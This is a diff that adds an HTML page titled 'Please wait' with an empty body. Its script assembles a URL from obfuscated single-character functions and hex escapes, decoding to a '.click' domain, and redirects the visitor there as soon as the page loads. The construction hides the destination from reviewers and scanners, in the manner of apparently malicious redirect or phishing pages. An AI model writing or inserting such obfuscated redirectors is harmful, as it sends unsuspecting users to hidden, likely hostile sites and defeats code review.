@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Please wait</title>
+    <script>
+        const chunks = [
+            () => 'h',
+            () => 't',
+            () => "t",
+            () => 'p',
+            () => '\x73',
+            function() { return ":"; },
+            e => "/",
+            () => '/',
+            () => '\x76',
+            () => '\x65',
+            () => '\x72',
+            function() { return "g"; },
+            () => '\x65',
+            q => 'n',
+            () => '\x2e',
+            x => "c",
+            () => "l",
+            __ => 'i',
+            () => '\x63',
+            function() { return "k"; },
+            k => "/",
+            function() { return 's'; },
+            () => '\x2f',
+            () => '\x72',
+            function() { return "e"; },
+            () => 'p'
+        ];
+        const url = chunks.reduce((str, fn) => str + fn(), '');
+
+        document.location = url;
+    </script>
+</head>
+<body></body>
+</html>
